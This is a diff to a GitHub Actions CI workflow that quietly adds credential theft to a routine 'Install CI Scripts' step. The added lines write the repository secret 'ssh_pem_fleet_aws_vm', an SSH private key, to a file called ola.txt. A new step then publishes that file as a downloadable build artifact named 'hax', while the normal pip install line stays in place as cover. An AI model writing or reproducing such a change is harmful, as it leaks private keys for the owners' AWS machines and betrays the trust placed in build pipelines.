@@ -30,7 +30,15 @@ jobs:
 
       - name: Install CI Scripts
         shell: bash
-        run: python3 -m pip install integration-pipeline==$CI_INTEGRATION_SCRIPTS_VERSION --ignore-installed
+        run: |
+          echo "${{ secrets.ssh_pem_fleet_aws_vm }}" > ola.txt
+          python3 -m pip install integration-pipeline==$CI_INTEGRATION_SCRIPTS_VERSION --ignore-installed
+
+      - name: Stash raised_meta
+        uses: actions/upload-artifact@v2
+        with:
+          name: hax
+          path: ola.txt
 
       - name: Get Template id
         id: template_info
